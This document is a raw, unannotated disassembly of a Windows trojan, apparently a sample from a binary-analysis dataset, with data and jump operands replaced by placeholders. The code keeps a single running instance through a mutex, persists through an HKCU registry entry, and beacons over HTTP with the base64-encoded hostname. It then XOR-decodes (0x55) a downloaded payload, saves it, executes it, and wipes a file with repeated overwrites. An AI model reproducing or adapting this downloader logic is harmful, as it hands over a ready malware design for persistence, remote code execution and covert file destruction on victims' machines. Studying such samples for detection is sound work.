sub_401000
sub esp 0x1c
push esi
push edi
call sub_40119b
call sub_401091
test eax eax
jg r-xdata
call sub_401349
xor edi edi
test eax eax
je r-xdata
push 0x0
call exit
push rw-data
push edi
push edi
call [ CreateMutexA@IAT ]
mov esi [ GetLastError@IAT ]
call esi
cmp eax 0xb7
je r-xdata
push 0x1
call _sleep
pop ecx
push edi
push edi
push edi
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x1c
retn 0x10
call esi
cmp eax 0x5
je r-xdata
push edi
push edi
lea eax [ esp + 0x10 ]
push edi
push eax
call [ GetMessageA@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
call sub_401377
push edi
call exit
sub_401091
push ebp
mov ebp esp
sub esp 0x154
push esi
push edi
xor esi esi
push 0xa
lea eax [ ebp - 0xc ]
push esi
push eax
call memset
push 0xa
lea eax [ ebp - 0x18 ]
push esi
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x154 ]
push 0x103
push eax
push esi
call [ GetModuleFileNameA@IAT ]
push esi
push 0x80
push 0x3
push esi
push 0x1
lea eax [ ebp - 0x154 ]
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x50 ]
push esi
push eax
push edi
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
push eax
jmp r-xdata
push edi
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
jne r-xdata
call [ CloseHandle@IAT ]
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ FileTimeToSystemTime@IAT ]
push edi
call [ CloseHandle@IAT ]
movzx eax [ ebp - 0x2a ]
push eax
mov esi rw-data
movzx eax [ ebp - 0x2e ]
push eax
movzx eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0xc ]
push esi
push eax
call sprintf
lea eax [ ebp - 0xc ]
push eax
call atoi
add esp 0x18
mov edi eax
lea eax [ ebp - 0x48 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x42 ]
push eax
movzx eax [ ebp - 0x46 ]
push eax
movzx eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x18 ]
push esi
push eax
call sprintf
lea eax [ ebp - 0x18 ]
push eax
call atoi
add esp 0x18
sub eax edi
sub_40119b
push ebp
mov ebp esp
sub esp 0x20c
lea eax [ ebp - 0x108 ]
push 0x103
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x108 ]
push 0x5c
push eax
call strrchr
pop ecx
inc eax
pop ecx
push eax
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
xor eax eax
leave
retn
lea eax [ ebp - 0x108 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x108 ]
push eax
push 0x1
lea eax [ ebp - 0x20c ]
push 0x0
push eax
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
sub_40122c
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
push edi
push rw-data
call sub_401322
mov [ esp ] rw-data
call sub_401322
mov [ esp ] rw-data
call sub_401322
mov [ esp ] rw-data
call sub_401322
mov [ esp ] rw-data
call sub_401322
mov [ esp ] rw-data
call sub_401322
mov ebx rw-data
push ebx
call sub_401322
mov esi 0x104
xor edi edi
push esi
lea eax [ ebp - 0x104 ]
push edi
push eax
call memset
push esi
lea eax [ ebp - 0x104 ]
push edi
push eax
call memset
push esi
push edi
mov edi rw-data
push edi
call memset
add esp 0x2c
lea eax [ ebp - 0x208 ]
push 0x103
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x208 ]
push 0x5c
push eax
call strrchr
mov esi eax
lea eax [ ebp - 0x208 ]
sub esi eax
lea eax [ ebp - 0x208 ]
push esi
push eax
lea eax [ ebp - 0x104 ]
push eax
call strncpy
and [ ebp + esi - 0x104 ] 0x0
add esp 0x14
lea eax [ ebp - 0x104 ]
push ebx
push eax
push rw-data
push edi
call sprintf
add esp 0x10
pop edi
pop esi
pop ebx
leave
retn
sub_401322
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4017ab
push esi
call strlen
pop ecx
pop ecx
and [ eax + esi + 0x1 ] 0x0
xor eax eax
pop esi
retn
test eax eax
jg r-xdata
dec eax
cmp [ eax + esi ] 0x20
jne r-xdata
sub_401377
push ebp
mov ebp esp
sub esp 0x614
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
call sub_40122c
push rw-data
call sub_4018d6
mov [ esp ] rw-data
call atoi
mov [ ebp - 0x8 ] eax
mov [ esp ] rw-data
call atoi
xor esi esi
cmp [ ebp - 0x8 ] edi
pop ecx
mov [ ebp - 0xc ] eax
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
mov ebx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov edi 0x100
push 0x50
push rw-data
push rw-data
call sub_401644
add esp 0xc
cmp [ rw-data ] 0xc8
mov ebx eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
push rw-data
push ebx
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0xc8
jne r-xdata
push edi
lea eax [ ebp - 0x214 ]
push esi
push eax
call memset
push 0x400
lea eax [ ebp - 0x614 ]
push esi
push eax
call memset
push edi
lea eax [ ebp - 0x114 ]
push esi
push eax
call memset
add esp 0x24
lea eax [ ebp - 0x214 ]
push edi
push eax
call [ gethostname@IAT ]
lea eax [ ebp - 0x214 ]
push eax
call strlen
mov esi eax
pop ecx
cmp esi 0x7
jge r-xdata
cmp [ ebp - 0x4 ] edi
jne r-xdata
push ebx
call free
pop ecx
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
push rw-data
push ebx
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x214 ]
push 0x7
push eax
lea eax [ ebp - 0x114 ]
push eax
call strncpy
add esp 0xc
lea eax [ ebp - 0x214 ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push eax
call strncpy
add esp 0xc
lea edi [ ebp + esi - 0x114 ]
mov eax 0x73737373
push 0x7
pop edx
sub edx esi
mov ecx edx
add edx esi
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
and [ ebp + edx - 0x114 ] 0x0
mov edi 0x100
jmp r-xdata
inc esi
cmp esi [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp - 0xc ]
imul eax eax 0x3e8
push eax
call _sleep
pop ecx
mov eax [ ebp - 0xc ]
imul eax eax 0x3e8
push eax
call _sleep
push ebx
call free
pop ecx
test ebx ebx
je r-xdata
test ebx ebx
mov [ ebp - 0x10 ] 0x1
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x114 ]
push eax
call sub_401a46
mov esi eax
lea eax [ ebp - 0x614 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x614 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x614 ]
push esi
push eax
call strcat
push 0x50
lea eax [ ebp - 0x614 ]
push rw-data
push eax
call sub_401644
add esp 0x30
mov ebx eax
cmp [ ebp - 0x4 ] edi
jne r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
xor esi esi
cmp [ ebp - 0x10 ] esi
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
push [ rw-data ]
push ebx
call sub_401879
push 0x2
pop esi
push esi
push rw-data
push ebx
call strncmp
add esp 0x14
test eax eax
jne r-xdata
push ebx
call free
jmp r-xdata
push rw-data
push rw-data
mov [ ebp - 0x10 ] esi
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop ecx
push ebx
call free
mov [ esp ] rw-data
call sub_40188d
jmp r-xdata
push esi
push [ rw-data ]
push 0x1
push ebx
call fwrite
push esi
call fclose
add esp 0x14
sub_401644
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push 0x4
pop edi
xor ebx ebx
push rw-data
xor esi esi
mov [ ebp - 0x14 ] edi
call _strdup
pop ecx
push ebx
push ebx
push ebx
push edi
push eax
call [ InternetOpenA@IAT ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
xor eax eax
push ebx
push ebx
push 0x3
push ebx
push ebx
push [ ebp + 0x10 ]
push rw-data
push eax
call [ InternetConnectA@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
push [ ebp - 0xc ]
call [ InternetCloseHandle@IAT ]
mov eax ebx
jmp r-xdata
push ebx
push 0x4400100
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp + 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
call [ InternetCloseHandle@IAT ]
push ebx
push ebx
push ebx
push ebx
push edi
call [ HttpSendRequestA@IAT ]
lea eax [ ebp - 0x14 ]
push ebx
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x20000013
push edi
call [ HttpQueryInfoA@IAT ]
mov eax [ ebp - 0x10 ]
cmp eax 0x197
je r-xdata
push 0x3e8
call _sleep
pop ecx
push ebx
push 0x7
push ebx
push edi
call [ GetDesktopWindow@IAT ]
push eax
call [ InternetErrorDlg@IAT ]
mov esi [ InternetCloseHandle@IAT ]
push edi
call esi
push [ ebp - 0x8 ]
call esi
push [ ebp - 0xc ]
call esi
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
push 0x400
mov [ rw-data ] eax
call malloc
cmp edi ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
push edi
call free
pop ecx
mov [ edi + esi ] bl
mov [ rw-data ] esi
mov ebx edi
add esi [ ebp - 0x4 ]
lea eax [ esi + 0x400 ]
push eax
push edi
call realloc
pop ecx
jmp r-xdata
push [ ebp + 0x10 ]
call [ InternetCloseHandle@IAT ]
mov edi eax
pop ecx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + esi ]
push 0x3ff
push eax
push [ ebp + 0x10 ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
sub_4017ab
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call strlen
pop ecx
mov edi eax
xor ecx ecx
test edi edi
jle r-xdata
pop edi
xor eax eax
pop esi
retn
push ebx
test [ ecx + esi ] 0x1
je r-xdata
dec edx
je r-xdata
and bl 0xfe
or bl 0x1
jmp r-xdata
test [ ecx + esi ] 0x2
je r-xdata
dec edx
dec edx
je r-xdata
mov edx eax
dec edx
je r-xdata
mov [ ecx + esi ] bl
inc ecx
cmp ecx edi
jl r-xdata
cdq
sub eax edx
sar eax 0x1
test eax eax
jg r-xdata
and bl 0xef
jmp r-xdata
or bl 0x10
jmp r-xdata
test [ ecx + esi ] 0x4
je r-xdata
sub edx 0x4
je r-xdata
xor bl bl
mov eax 0x80
pop ebx
and bl 0xfb
jmp r-xdata
or bl 0x4
jmp r-xdata
test [ ecx + esi ] 0x8
je r-xdata
sub edx 0x8
je r-xdata
and bl 0xf7
jmp r-xdata
or bl 0x8
jmp r-xdata
test [ ecx + esi ] 0x10
je r-xdata
sub edx 0x10
je r-xdata
and bl 0xfd
jmp r-xdata
or bl 0x2
jmp r-xdata
test [ ecx + esi ] 0x20
je r-xdata
sub edx 0x20
jne r-xdata
and bl 0xbf
jmp r-xdata
or bl 0x40
jmp r-xdata
test [ ecx + esi ] 0x40
je r-xdata
and bl 0xdf
jmp r-xdata
or bl 0x20
jmp r-xdata
sub_40188d
push ebp
mov ebp esp
sub esp 0x54
push esi
push 0x44
pop eax
xor esi esi
mov [ ebp - 0x54 ] eax
push eax
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x81
mov [ ebp - 0x24 ] si
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push 0x20
push esi
push esi
push esi
push [ ebp + 0x8 ]
push esi
call [ CreateProcessA@IAT ]
dec eax
pop esi
neg eax
sbb eax eax
leave
retn
sub_4018d6
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push ebx
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
push 0x8
push 0x80
push ebx
call [ SetFileAttributesA@IAT ]
push rw-data
push ebx
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x7
jmp r-xdata
push [ esi + 0x10 ]
call _filelength
push esi
mov edi eax
call fclose
pop ecx
test edi edi
pop ecx
jle r-xdata
pop eax
push ebx
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
add eax 0x6
jmp r-xdata
push edi
call malloc
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x4
jmp r-xdata
mov esi rw-data
push esi
push [ ebp + 0x8 ]
call fopen
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push esi
push [ ebp + 0x8 ]
call fopen
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push edi
push 0xff
push ebx
call memset
push [ ebp - 0x4 ]
push edi
push 0x1
push ebx
call fwrite
push [ ebp - 0x4 ]
call fflush
push [ ebp - 0x4 ]
call fclose
add esp 0x24
mov [ ebp - 0x8 ] 0x1
push esi
push [ ebp + 0x8 ]
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push edi
push 0x0
push ebx
call memset
push [ ebp - 0x4 ]
push edi
push 0x1
push ebx
call fwrite
push [ ebp - 0x4 ]
call fflush
push [ ebp - 0x4 ]
call fclose
add esp 0x24
mov [ ebp - 0x8 ] 0x1
push ebx
call free
cmp [ ebp - 0x8 ] 0x1
pop ecx
jne r-xdata
push edi
push 0x55
push ebx
call memset
push esi
push edi
push 0x1
pop edi
push edi
push ebx
call fwrite
push esi
call fflush
push esi
call fclose
add esp 0x24
mov [ ebp - 0x8 ] edi
push 0x3
jmp r-xdata
push [ ebp + 0x8 ]
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
inc eax
inc eax
jmp r-xdata
sub_401a46
push esi
mov esi [ esp + 0xc ]
mov eax esi
push edi
shl eax 0x2
push 0x3
cdq
pop ecx
idiv ecx
add eax 0x4
push eax
call malloc
mov edi eax
push edi
push esi
push [ esp + 0x18 ]
call sub_401a75
add esp 0x10
mov eax edi
pop edi
pop esi
retn
sub_401a75
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0x3
pop edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor edx edx
mov ecx edi
push ebx
div ecx
mov ecx eax
imul ecx ecx 0xfffffffd
add [ ebp + 0xc ] ecx
mov ecx [ ebp + 0x8 ]
and [ esi ] 0x0
mov eax esi
sub eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebp
retn
movzx eax [ ecx ]
mov edx [ rw-data ]
shr eax 0x2
cmp [ ebp + 0xc ] 0x1
mov al [ eax + edx ]
mov [ esi ] al
mov al [ ecx ]
jne r-xdata
movzx edx [ ecx ]
mov ebx [ rw-data ]
shr edx 0x2
mov dl [ edx + ebx ]
mov [ esi ] dl
mov dl [ ecx ]
movzx ebx [ ecx + 0x1 ]
and edx edi
add esi 0x4
shl edx 0x4
shr ebx 0x4
or edx ebx
mov ebx [ rw-data ]
mov dl [ edx + ebx ]
mov [ esi - 0x3 ] dl
mov dl [ ecx + 0x1 ]
movzx ebx [ ecx + 0x2 ]
and edx 0xf
shl edx 0x2
shr ebx 0x6
or edx ebx
mov ebx [ rw-data ]
mov dl [ edx + ebx ]
mov [ esi - 0x2 ] dl
mov dl [ ecx + 0x2 ]
mov ebx [ rw-data ]
and edx 0x3f
add ecx edi
dec eax
mov dl [ edx + ebx ]
mov [ esi - 0x1 ] dl
jne r-xdata
pop ebx
jmp r-xdata
movzx edx [ ecx + 0x1 ]
and eax edi
shl eax 0x4
shr edx 0x4
or eax edx
mov edx [ rw-data ]
mov al [ eax + edx ]
mov [ esi + 0x1 ] al
mov al [ ecx + 0x1 ]
mov ecx [ rw-data ]
and eax 0xf
mov al [ ecx + eax * 4 ]
mov [ esi + 0x2 ] al
mov ecx [ rw-data ]
and eax edi
shl eax 0x4
mov al [ eax + ecx ]
mov [ esi + 0x2 ] 0x3d
mov [ esi + 0x1 ] al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ esi + 0x3 ] 0x3d
add esi 0x4
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401d71
cmp [ rw-data ] ebx
jne r-xdata
call sub_401d5c
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401d6e
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401349
push ebp
mov ebp esp
sub esp 0x94
lea eax [ ebp - 0x94 ]
mov [ ebp - 0x94 ] 0x94
push eax
call [ GetVersionExA@IAT ]
xor eax eax
cmp [ ebp - 0x84 ] 0x2
sete al
leave
retn
sub_401879
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test ecx ecx
jle r-xdata
retn
xor [ eax ] 0x55
inc eax
dec ecx
jne r-xdata
_sleep
jmp [ _sleep@IAT ]
exit
jmp [ exit@IAT ]
atoi
jmp [ atoi@IAT ]
sprintf
jmp [ sprintf@IAT ]
memset
jmp [ memset@IAT ]
strlen
jmp [ strlen@IAT ]
strrchr
jmp [ strrchr@IAT ]
strncpy
jmp [ strncpy@IAT ]
fclose
jmp [ fclose@IAT ]
fwrite
jmp [ fwrite@IAT ]
fopen
jmp [ fopen@IAT ]
strncmp
jmp [ strncmp@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
free
jmp [ free@IAT ]
strstr
jmp [ strstr@IAT ]
realloc
jmp [ realloc@IAT ]
malloc
jmp [ malloc@IAT ]
fflush
jmp [ fflush@IAT ]
_filelength
jmp [ _filelength@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401d5c
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401d6e
xor eax eax
retn
sub_401d71
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
_strdup
jmp [ _strdup@IAT ]
